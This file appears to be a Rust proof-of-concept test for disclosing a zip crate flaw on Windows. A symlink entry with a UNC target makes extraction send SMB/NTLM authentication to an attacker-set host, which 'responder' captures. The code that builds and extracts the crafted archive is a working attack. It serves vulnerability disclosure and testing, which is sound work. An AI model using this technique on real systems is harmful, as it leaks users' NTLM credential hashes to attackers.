//! Windows PoC:
//! A symlink entry's UNC target triggers outbound SMB/NTLM authentication.
//!
//! - author: sl91994
//!
//! Mechanism:
//! On Windows, `make_symlink_impl` calls `std::fs::metadata` on the attacker-controlled
//! target before creating the symlink. If the target is a UNC path, the Windows SMB
//! client connects and authenticates.
//!
//! Usage:
//!   1. Start an SMB listener on the attacker machine (e.g.):
//!        `responder -I <iface> -v`
//!   2. Set the attacker's IP/name via an environment variable and run on the Windows (victim) host:
//!        `set ZIP2_POC_UNC_HOST=<attacker_ip>`
//!        `cargo test --test poc_windows_ntlm unc_target_via_no_restrictions_head_only -- --nocapture --ignored`
//!        `cargo test --test poc_windows_ntlm unc_target_triggers_metadata_before_symlink_creation -- --nocapture --ignored`
//!   3. NTLMv2 authentication arrives at the listener.

#![cfg(windows)]

use std::io::{Cursor, Write};
use std::path::Path;

use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

/// Build a ZIP containing a single symlink entry.
fn build_zip_with_symlink(name: &str, target: &str) -> Vec<u8> {
    let opt = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    zip.add_symlink(name, target, opt).unwrap();
    // metadata() is called on the target itself before the symlink is created.
    zip.finish().unwrap().into_inner()
}

fn report_link_state(link: &Path) {
    match std::fs::symlink_metadata(link) {
        Ok(m) => println!(
            "link entry exists: is_symlink={}, is_file={}",
            m.file_type().is_symlink(),
            m.is_file()
        ),
        Err(e) => println!("link entry not created ({e}); metadata() may still have run"),
    }
}

/// v9.0.0 pre3 and earlier.
#[test]
#[ignore = "involving outbound SMB connections"]
fn unc_target_triggers_metadata_before_symlink_creation() {
    let host = std::env::var("ZIP2_POC_UNC_HOST").expect(
        "set the target host in ZIP2_POC_UNC_HOST (the IP/HOST of an SMB listener the tester controls)",
    );
    // The UNC path, share name, and file name are arbitrary.
    let target = format!(r"\\{host}\share\probe");
    println!("symlink target = {target}");

    let buf = build_zip_with_symlink("link", &target);

    let dest = std::env::temp_dir().join("zip2_poc_ntlm");
    let _ = std::fs::remove_dir_all(&dest);
    std::fs::create_dir_all(&dest).unwrap();

    // In release builds (v1.3.0+), a plain extract() enters this path.
    let res = ZipArchive::new(Cursor::new(buf)).unwrap().extract(&dest);
    println!("extract() returned: {res:?}");

    // The success of extract() does not matter (even if symlink creation fails due to
    // insufficient privileges, the preceding metadata() still triggers the SMB/NTLM connection).
    report_link_state(&dest.join("link"));
}

/// To test the ExtractNoRestrictions path: v9.0.0 and later (including v9.0.4).
#[test]
#[ignore = "involving outbound SMB connections"]
fn unc_target_via_no_restrictions_head_only() {
    // Older versions lack this API and would fail to compile, so uncomment only on HEAD.
    use zip::read::{ExtractOptions, SymlinkExtractAction};
    let host = std::env::var("ZIP2_POC_UNC_HOST").expect("set ZIP2_POC_UNC_HOST");
    let target = format!(r"\\{host}\share\probe");
    let buf = build_zip_with_symlink("link", &target);
    let dest = std::env::temp_dir().join("zip2_poc_ntlm_head");
    let _ = std::fs::remove_dir_all(&dest);
    std::fs::create_dir_all(&dest).unwrap();
    let res = ZipArchive::new(Cursor::new(buf))
        .unwrap()
        .extract_with_options(
            &dest, ExtractOptions::default().symlink_action(SymlinkExtractAction::ExtractNoRestrictions),
        );
    println!("extract_with_options(NoRestrictions) returned: {res:?}");
}
